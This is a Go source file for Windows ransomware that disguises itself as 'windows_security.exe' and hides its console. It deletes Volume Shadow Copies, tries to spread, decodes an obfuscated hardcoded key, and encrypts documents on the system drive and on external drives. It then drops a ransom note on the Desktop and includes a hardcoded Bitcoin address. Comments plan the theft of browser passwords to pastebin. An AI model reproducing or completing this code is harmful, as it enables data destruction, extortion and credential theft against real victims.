//Compile: go build -ldflags "-s -w -H=windowsgui"
package main

import "os"
import "encoding/base64"
import "io/ioutil"
import "github.com/rodolfoag/gow32"

const TARGET_FILE_NAME = "windows_security.exe" // check name Wscript.exe
const BTC_ADDRESS string = "1BwwT5zo5FwQdWniUSay2AUrPrbYph9SxP"

var key_text []byte
var priv []byte //RSA Priv key, hardcoded

func main() {
	//Check if already running
	CheckMultiInstances()
	//Install to location
	Install()

	Run("vssadmin.exe Delete Shadows /All /Quiet") //admin
	Spread()

	/*if ReadRegDone() {
		//Already encrypted
		PromtPay()
		ListenForPayment()
	}*/

	//Run Analytics
	//Put name, IP and status to pastebin

	//Send chrome pass to pastebin

	//Gen aes key,
	//Gen
	//Deofuscate key
	b64_1 := "fSss" + "L1IkKy"
	b64_2 := "p3ZU4zR" + "3g5e"
	b64_3 := "ipMZy5" + "VYm13O"
	b64_4 := "Xg+WF" + "9jKnE="
	final := b64_1 + b64_2 + b64_3 + b64_4
	key_text = []byte(Base64Decode(final))
	//When key decoded
	InitializeBlock()

	//then encrytp files
	EncryptExternalDrives(true)
	EncryptDocumets("C:\\", true)
	//Encrypt net drives

	// Once encrypted
	//WriteRegDone()
	// Write done to pastebin
	PromtPay()

	//ListenForPayment()
}

func EncryptExternalDrives(mode bool) {
	drives := GetDrives()
	for _, drive := range drives {
		EncryptDocumets(drive+":\\", mode)
	}
}

func Base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func Base64Decode(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}

func PromtPay() {
	/*
	*	Copy instructions to Desktop and opens it
	 */
	ioutil.WriteFile(os.Getenv("USERPROFILE")+"\\Desktop\\Instructions.html", []byte(TEXT), 0644)
	Run("start " + os.Getenv("USERPROFILE") + "\\Desktop\\Instructions.html") //Not checked
	Run("msg * All your files have been encrypted, read the note in your Desktop")
}

func CheckMultiInstances() {
	/*
	*	Check if already running, if so Start in wait mode
	 */
	_, err := gow32.CreateMutex("Windows_Security")
	if err != nil {
		// TODO start in wait mode
		Run("msg * Running")
		os.Exit(0)

	}
}
